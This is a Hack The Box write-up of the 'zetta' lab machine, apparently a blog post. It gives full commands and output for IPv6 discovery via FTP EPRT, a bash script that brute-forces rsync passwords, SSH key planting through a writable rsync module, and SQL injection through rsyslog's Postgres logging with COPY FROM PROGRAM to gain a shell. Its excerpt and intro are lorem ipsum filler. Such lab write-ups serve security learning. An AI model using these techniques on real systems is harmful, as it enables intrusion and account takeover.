---
layout: single
title: zetta - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-12-02
classes: wide
header:
  teaser: /assets/images/htb-writeup-zetta/zetta_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-zetta/zetta_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@kali:/opt/htb/machines/bitlab# nmapAutomatorDirb.sh 10.10.10.156 All
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Pure-FTPd
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    |_sslv2-drown:
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    80/tcp open  http    nginx
    |_clamav-exec: ERROR: Script execution failed (use -d to debug)
    | http-csrf:
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=zetta.htb
    |   Found the following possible CSRF vulnerabilities:
    |
    |     Path: http://zetta.htb:80/
    |     Form id: contactform
    |     Form action: #
    |
    |     Path: http://zetta.htb:80/index.html
    |     Form id: contactform
    |_    Form action: #
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB
    + http://10.10.10.156:80/index.html (CODE:200|SIZE:39533)

    NIKTO
    + Server: nginx


2. Looking on the website we find
    - Dual-Stack Support 60%
    - FTP RFC2428 Support (v6)
    - FTP Creds (free)
      6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5:6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5


3. Reading RFC2428 they inform about the function EPRT, which is used to connect to another host.
   The following are sample EPRT commands:
     EPRT |1|132.235.1.2|6275|
     EPRT |2|1080::8:800:200C:417A|5282|

   We can use this to send a connection to our attacking devices to disclose the victims (Zetta) IPv6 address.
   However EPRT isn't a valid "normal" FTP command, it is a RAW FTP command. Instead of using FTP, we use telnet port 21.

   root@kali:/opt/htb/machines/zetta# telnet zetta.htb 21
      Trying 10.10.10.156...
      Connected to zetta.htb.
      Escape character is '^]'.
      220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
      220-You are user number 1 of 500 allowed.
      220-Local time is now 09:12. Server port: 21.
      220-This is a private system - No anonymous login
      220-IPv6 connections are also welcome on this server.
      220 You will be disconnected after 15 minutes of inactivity.
    USER 6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5
      331 User 6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5 OK. Password required
    PASS 6OJCaGVYOJKtY3zFFQUTmtZNl8BHEuq5
      230-This server supports FXP transfers
      230-OK. Current restricted directory is /
      230-0 files used (0%) - authorized: 10 files
      230 0 Kbytes used (0%) - authorized: 1024 Kb
    eprt |2|dead:beef:2::1008|4488|
      200-FXP transfer: from 10.10.14.10 to dead:beef:2::1008%160
      200 PORT command successful

4. We must retrieve the IPv6 address somehow so lets setup tcpdump, and then execute a raw ftp command to send data.

    RAW FTP:
      eprt |2|dead:beef:2::1008|4488|
        200-FXP transfer: from 10.10.14.10 to dead:beef:2::1008%160
        200 PORT command successful
      LIST
        425 Could not open data connection to port 4488: Connection refused

    root@kali:~# tcpdump -i tun0 -vv ip6
      tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
      09:12:32.613603 IP6 (flowlabel 0x6bdb7, hlim 63, next-header TCP (6) payload length: 40) dead:beef::250:56ff:feb9:df29.37250 > kali.4488: Flags [S], cksum 0x64d3 (correct), seq 1305187145, win 28800, options [mss 1337,sackOK,TS val 374756922 ecr 0,nop,wscale 7], length 0
      09:12:32.613626 IP6 (flowlabel 0xbe7b8, hlim 64, next-header TCP (6) payload length: 20) kali.4488 > dead:beef::250:56ff:feb9:df29.37250: Flags [R.], cksum 0xa938 (correct), seq 0, ack 1305187146, win 0, length 0

    IPv6 address of Zetta: dead:beef::250:56ff:feb9:df29

5. Lets scan the IPv6 address with nmap to see if there are any other ports open.

    root@kali:/opt/htb/machines/zetta# nmap -6 dead:beef::250:56ff:feb9:df29 -p-
      Nmap scan report for dead:beef::250:56ff:feb9:df29
      Not shown: 65531 closed ports
      PORT     STATE SERVICE
      21/tcp   open  ftp
      22/tcp   open  ssh
      80/tcp   open  http
      8730/tcp open  unknown

    A new port, 8730!

6. Connect to port 8730 using Telnet.
    root@kali:/opt/htb/machines/zetta# telnet dead:beef::250:56ff:feb9:df29 8730
      Trying dead:beef::250:56ff:feb9:df29...
      Connected to dead:beef::250:56ff:feb9:df29.
      Escape character is '^]'.
      @RSYNCD: 31.0
      ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

      You must have explicit, authorized permission to access this rsync
      server. Unauthorized attempts and actions to access or use this
      system may result in civil and/or criminal penalties.

      All activities performed on this device are logged and monitored.

      ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

      @ZE::A staff

      This rsync server is solely for access to the zetta master server.
      The modules you see are either provided for "Backup access" or for
      "Cloud sync".

    Looks like it's used for rsync. In order to pull info from the server we need SSH-creds.
      Rsync pull syntax: rsync -6 zetta-user@[dead:beef::250:56ff:feb9:df29]:/home/zetta-user/ /opt/htb/machines/zetta/


7. We can list all rsync modules by writing
    rsync -6r rsync://[dead:beef::250:56ff:feb9:df29]:8730/ .
      bin            	Backup access to /bin
      boot           	Backup access to /boot
      lib            	Backup access to /lib
      lib64          	Backup access to /lib64
      opt            	Backup access to /opt
      sbin           	Backup access to /sbin
      srv            	Backup access to /srv
      usr            	Backup access to /usr
      var            	Backup access to /var

    The output is sparse, and we don't have access to backup any of the directories.
    Reading on the forums they say:
    "If you've got the list of modules, there's some hidden ones. Think about what folders are interesting on most linux systems."

    Because of this I tried to pull directories of intrest from the server to my local box, and behold /etc was available
      root@kali:/opt/htb/machines/zetta# rsync -6r rsync://[dead:beef::250:56ff:feb9:df29]:8730/etc etc/

8. Within the folders we don't find anything giving us direct access, like id_rsa, passwords etc.
   However we do find all valid users that are able to ssh, as well as another hidden rsync module (home_roy)
     root@kali:/opt/htb/machines/zetta/etc# cat passwd
       root:x:0:0:root:/root:/bin/bash
       roy:x:1000:1000:roy,,,:/home/roy:/bin/bash
       postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

     root@kali:/opt/htb/machines/zetta/etc# cat rsyncd.conf
       ..
       [home_roy]
       	path = /home/roy
       	read only = no
       	# Authenticate user for security reasons.
       	uid = roy
       	gid = roy
       	auth users = roy
       	secrets file = /etc/rsyncd.secrets
       	# Hide home module so that no one tries to access it.
       	list = false

    Rest of the rsync modules are only available from host 104.24.0.54

9. Lets create a simple brute force script to grab passwords from rockyou.txt and auto-backup module home_roy as user roy.
   We can call the environmental variable RSYNC_PASSWORD so we don't get prompted to enter a password.

    root@kali:/opt/htb/machines/zetta# cat rsyncBrute-v6.sh
      #!/bin/bash
      ## INPUT VARIABLES
      ## NOTE: Module input MUST start with /
      USER="roy"
      PASSFILE="/usr/share/wordlists/rockyou.txt"
      IPV6="dead:beef::250:56ff:feb9:a83e"
      PORT="8730"
      MODULE="/home_roy"
      DEST="/opt/htb/machines/zetta/home_roy/"

      for i in $(cat $PASSFILE); do
        printf "\n##########################################\n"
        printf "\tTESTING PASSWORD: "$i
        printf "\n##########################################\n"
        env RSYNC_PASSWORD=$i rsync -r6v rsync://$USER@[$IPV6]:$PORT$MODULE $DEST
      done


   The script don't have any escape function so we must look at the output and be fast to cancel it when we are successful.
    root@kali:/opt/htb/machines/zetta# ./rsyncBrute-v6.sh
      ..
      ..
      ##########################################
      	     TESTING PASSWORD: computer
      ##########################################
      ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

      You must have explicit, authorized permission to access this rsync
      server. Unauthorized attempts and actions to access or use this
      system may result in civil and/or criminal penalties.

      All activities performed on this device are logged and monitored.

      ****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

      @ZE::A staff

      This rsync server is solely for access to the zetta master server.
      The modules you see are either provided for "Backup access" or for
      "Cloud sync".


      receiving incremental file list
      skipping non-regular file ".bash_history"
      .bash_logout
      .bashrc
      .profile
      .tudu.xml
      user.txt

      sent 119 bytes  received 9,743 bytes  6,574.67 bytes/sec
      total size is 9,347  speedup is 0.95

10. Rsync credentials found (roy:computer) and we we're able to backup /home/roy containing user.txt
    root@kali:/opt/htb/machines/zetta/home_roy# cat user.txt
      a575****************************



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. The rsync module home_roy has option "read only = no", hinting that we should upload a file to get a shell. Upload ssh pub key
   to authorized_keys. Start by creating the keys and file to upload.

   root@kali:/opt/htb/machines/zetta# ssh-keygen -t rsa -b 4096
     Generating public/private rsa key pair.
     Enter file in which to save the key (/root/.ssh/id_rsa): /opt/htb/machines/zetta/id_rsa-zetta
     Enter passphrase (empty for no passphrase):
     Enter same passphrase again:
     Your identification has been saved in /opt/htb/machines/zetta/id_rsa-zetta.
     Your public key has been saved in /opt/htb/machines/zetta/id_rsa-zetta.pub.
     The key fingerprint is:
     SHA256:ryvpTwZfeLDElP6ngcYOA6vY+oICK/sTdIgUiHJCFD0 root@kali
     The key's randomart image is:
     +---[RSA 4096]----+
     |==+     ..       |
     |=..E   o.        |
     |o+ ..  .+        |
     |. o o  ..+       |
     | . . o..Soo      |
     |. . . oo++o .    |
     |o+ o   *+ .+     |
     |B +   oo...      |
     |=*o. ..o+.       |
     +----[SHA256]-----+

   root@kali:/opt/htb/machines/zetta# cat id_rsa-zetta.pub > authorized_keys
   root@kali:/opt/htb/machines/zetta# cat authorized_keys
     ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDDtv8vHi0OZO4zbtdn5pf2j7pnxd6cbA/Bxvxh0ZuwWaLu7WjzNHltDhydA/XoI3UCPQ8ZqyaieLV2eBOD+O0E+X2tyKx2RyKcMFNkKNSAq5F9AWULbl7pjbpbiQDSy3hvvFGBgND/vwGsXpnLFd+8v03cpa/9LramyvU/Exg6XlvN+10Z2nCrsA19UvPLY3C94iqINKt/nJ6JaAVDeTii9tMBCjI4M4jzt6U8zdeOlXdUVVUKdsNO9ggpwRGQxv262az/9hKaNNwKCDtbyiQoYBdhNBmguHQdk3Ob4gVT5Fh2QJgj0qMCtwb/LXgBtZkautO8VZMuc25cxuTMynR8GwCHBzj7hZ8dnkKnibWZSruUA4sMP2Zy+ge45lgL+kzDuRNT58nN1XsRxEzBc+JFChuKi7JngOOQ2AnwUt5K02R7Na8n18YzkaiE9aVodNZkvs59cwcf0svDXaWV0wY183h/k1Q0U5a2pdG5HhVDXsdE4uXXTtHcepYoZwkvsMlh1XtiPOp4aIDnxeLvZ2+tN/V48lfYAUnVPiA0bnN3xjcjprf7J0enCmyeCgghZJzoXMsIuicydYIW22g8wmOF8rB+iDAhCYBvlmrRYdP84SO0MfPLr50SNBN8gOUk0B1B6d68A/O17xs8DaTq3T50uiL2/K8CWKCHpAi/25gEgw== root@kali

   Upload authorized_keys to /home/roy/.ssh/ and login.
   root@kali:/opt/htb/machines/zetta# rsync -r6v /opt/htb/machines/zetta/authorized_keys rsync://roy@[dead:beef::250:56ff:feb9:a83e]:8730/home_roy/.ssh/
    Password: computer

   root@kali:/opt/htb/machines/zetta# ssh roy@zetta.htb -i id_rsa-zetta
     Enter passphrase for key 'id_rsa-zetta':
     Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
     Last login: Sat Aug 31 15:43:18 2019 from 10.10.14.2
    roy@zetta:~$

2. Enumerating roys home dir we find tudu.xml, the last line is especially interesting however we don't have any creds that match yet.
   "Change shared password scheme from @userid to something more secure."

   Copy + Paste lse.sh over to the victim and run it. We find that there are three .git dirs, and psql is running locally.
    [*] fst150 Looking for GIT/SVN repositories................................ yes!
      /etc/pure-ftpd/.git
      /etc/nginx/.git
      /etc/rsyslog.d/.git

    [*] net000 Services listening only on localhost............................ yes!
      tcp     LISTEN   0        128            127.0.0.1:5432          0.0.0.0:*

3. Looking through the dirs we find nothing interesting, however we are able to execute git-commands.
   Using git log and git show gives us interesting information. At first glance we get creds postgres:test1234
   however these don't work. But now at least we know that the logs are store in psql db syslog.

    roy@zetta:/etc/rsyslog.d/.git$ git show
      commit e25cc20218f99abd68a2bf06ebfa81cd7367eb6a (HEAD -> master)
      Author: root <root@zetta.htb>
      Date:   Sat Jul 27 05:51:43 2019 -0400

          Adding/adapting template from manual.

      diff --git a/pgsql.conf b/pgsql.conf
      index f31836d..9649f68 100644
      --- a/pgsql.conf
      +++ b/pgsql.conf
      @@ -1,5 +1,22 @@
       ### Configuration file for rsyslog-pgsql
       ### Changes are preserved

      -module (load="ompgsql")
      -*.* action(type="ompgsql" server="localhost" db="Syslog" uid="rsyslog" pwd="")
      +# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
      +#
      +# Used default template from documentation/source but adapted table
      +# name to syslog_lines so the Ruby on Rails application Maurice is
      +# coding can use this as SyslogLine object.
      +#
      +template(name="sql-syslog" type="list" option.sql="on") {
      +  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
      +  property(name="msg")
      +  constant(value="','")
      +  property(name="timereported" dateformat="pgsql" date.inUTC="on")
      +  constant(value="')")
      +}
      +
      +# load module
      +module(load="ompgsql")
      +
      +# Only forward local7.info for testing.
      +local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")

4. From the last two lines of the output below, we know that local7.info logs are sent into the db syslog. We can exploit this
   using 'logger -p local7.info' to send data into the database. With the command pg_exec we can execute postgres commands as well.
   Verify your injections for errors by following the log in /var/log/postgresql using tail -fF

    roy@zetta:/tmp$ logger -p local7.info "', now()); DROP TABLE IF EXISTS cmd_exec; -- #"
    roy@zetta:/tmp$ logger -p local7.info "', now()); CREATE TABLE cmd_exec(cmd_output text); -- #"
    roy@zetta:/tmp$ logger -p local7.info "', now()); COPY cmd_exec FROM PROGRAM \$\$echo ``ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDDtv8vHi0OZO4zbtdn5pf2j7pnxd6cbA/Bxvxh0ZuwWaLu7WjzNHltDhydA/XoI3UCPQ8ZqyaieLV2eBOD+O0E+X2tyKx2RyKcMFNkKNSAq5F9AWULbl7pjbpbiQDSy3hvvFGBgND/vwGsXpnLFd+8v03cpa/9LramyvU/Exg6XlvN+10Z2nCrsA19UvPLY3C94iqINKt/nJ6JaAVDeTii9tMBCjI4M4jzt6U8zdeOlXdUVVUKdsNO9ggpwRGQxv262az/9hKaNNwKCDtbyiQoYBdhNBmguHQdk3Ob4gVT5Fh2QJgj0qMCtwb/LXgBtZkautO8VZMuc25cxuTMynR8GwCHBzj7hZ8dnkKnibWZSruUA4sMP2Zy+ge45lgL+kzDuRNT58nN1XsRxEzBc+JFChuKi7JngOOQ2AnwUt5K02R7Na8n18YzkaiE9aVodNZkvs59cwcf0svDXaWV0wY183h/k1Q0U5a2pdG5HhVDXsdE4uXXTtHcepYoZwkvsMlh1XtiPOp4aIDnxeLvZ2+tN/V48lfYAUnVPiA0bnN3xjcjprf7J0enCmyeCgghZJzoXMsIuicydYIW22g8wmOF8rB+iDAhCYBvlmrRYdP84SO0MfPLr50SNBN8gOUk0B1B6d68A/O17xs8DaTq3T50uiL2/K8CWKCHpAi/25gEgw== root@kali`` >> /var/lib/postgresql/.ssh/authorized_keys\$\$; -- #"

    root@kali:/opt/htb/machines/zetta# ssh postgres@zetta.htb -i id_rsa-zetta
      Enter passphrase for key 'id_rsa-zetta':
      Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
      Last login: Wed Dec  4 12:58:47 2019 from 10.10.14.9
    postgres@zetta:~$ id
      uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)

5. Enumerating the home dir of postgres we find .psql_history containing creds.
    postgres@zetta:~$ cat .psql_history
      ..
      \d syslog_lines
      ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';

   Remembering the last line in tudu.xml found in /home/roy we can try if the password scheme is applicable for root
   (sup3rs3cur3p4ass@root)

    postgres@zetta:~$ su
      Password:
    root@zetta:/var/lib/postgresql# id
      uid=0(root) gid=0(root) groups=0(root)
    root@zetta:~# cat root.txt
      b940****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

RFC2428
  https://www.rfc-editor.org/rfc/rfc2428.html

RAW FTP
  https://stackoverflow.com/questions/46577846/how-to-use-raw-ftp-stor-command
  https://en.wikipedia.org/wiki/List_of_FTP_commands

Rsync
  https://www.atlantic.net/vps-hosting/how-to-use-rsync-copy-sync-files-servers/

Script
  https://likegeeks.com/bash-scripting-step-step-part2/
  https://stackoverflow.com/questions/13510229/giving-the-password-of-the-server-within-the-command
  https://serverfault.com/questions/127209/username-and-password-for-rsync-in-script

Git-commands
  https://www.edureka.co/blog/git-commands-with-example/

Local7 / Logger
  https://unix.stackexchange.com/questions/535675/rsyslog-filter-severity-not-working

Postgres SQL Injection
  http://pgtclng.sourceforge.net/pgtcldocs/pg-exec.html
  https://www.dionach.com/blog/postgresql-9x-remote-command-execution
  http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
  https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
``````